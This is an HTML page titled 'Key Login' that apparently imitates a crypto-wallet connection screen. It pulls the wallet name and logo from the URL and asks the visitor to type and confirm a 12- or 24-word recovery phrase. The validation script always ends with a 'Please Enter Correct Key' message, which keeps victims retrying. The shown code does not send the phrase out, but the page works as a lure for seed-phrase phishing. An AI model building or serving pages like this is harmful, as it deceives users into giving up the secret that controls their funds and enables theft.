<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Key Login</title>
    <link rel="stylesheet" href="./keylogin.css" />
  </head>

  <body>
    <div class="card">
      <img id="walletLogo" class="logo" src="" />
      <h2 id="walletName"></h2>

      <textarea
        id="phrase1"
        placeholder="Enter wallet phrase (12 or 24 words)"
      ></textarea>
      <textarea id="phrase2" placeholder="Confirm wallet phrase"></textarea>

      <label class="checkbox">
        <input type="checkbox" id="confirmCheck" />
        Are you sure you entered correctly?
      </label>

      <button class="btn" onclick="validateForm()">Connect Wallet</button>
    </div>

    <!-- POPUP -->
    <div id="popup">
      <p id="popupMsg">Please Fill Out This Field.</p>
      <button onclick="closePopup()">OK</button>
    </div>

    <script>
      const params = new URLSearchParams(window.location.search);
      const wallet = params.get("wallet");

      document.getElementById("walletName").innerText = wallet;

      let imgName = wallet.toLowerCase().replace(/\s+/g, "") + ".webp";
      document.getElementById("walletLogo").src = "wallet-icons/" + imgName;

      // Auto expand textareas
      document.querySelectorAll("textarea").forEach((box) => {
        box.addEventListener("input", () => {
          box.style.height = "auto";
          box.style.height = box.scrollHeight + "px";
        });
      });

      function validateForm() {
        const p1 = phrase1.value.trim();
        const p2 = phrase2.value.trim();
        const check = confirmCheck.checked;

        if (p1 === "") return showPopup("Please Enter Your Phrase.");
        if (p2 === "") return showPopup("Please Confirm The Phrase.");
        if (p1 !== p2) return showPopup("Phrases Do Not Match.");
        if (!check) return showPopup("Please Tick The Confirmation Checkbox.");

        // ðŸ”¥ SPECIAL KEY-LOGIN POPUP
        return showPopup("Please Enter Correct Key.");
      }

      function showPopup(msg) {
        popupMsg.innerText = msg;
        popup.style.display = "block";
      }

      function closePopup() {
        popup.style.display = "none";
      }
    </script>
  </body>
</html>
